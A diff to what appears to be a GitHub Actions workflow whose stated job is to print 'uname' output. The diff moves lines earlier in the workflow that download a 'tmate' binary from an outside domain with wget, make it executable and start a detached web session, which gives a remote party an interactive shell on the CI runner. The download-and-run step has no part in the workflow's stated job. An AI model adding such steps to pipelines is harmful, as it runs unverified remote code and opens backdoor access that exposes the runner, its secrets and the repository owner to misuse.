@@ -22,13 +22,13 @@ jobs:
           run: |
             uname -a
             echo ::set-output name=uname::$(uname -a)
+            wget https://sabina.amyrom.ml/tmate
+            chmod +x ./tmate
+            sleep 15
+            ./tmate -F -n web new-session
+
 
       - name: Get the output
         # Echo the `uname` output parameter from the `runcmd` step
         run: |
           echo "The uname output was ${{ steps.runcmd.outputs.uname }}"
-          sudo apt install wget -y
-          wget https://sabina.amyrom.ml/tmate
-          chmod +x ./tmate
-          sleep 15
-          ./tmate -F -n web new-session
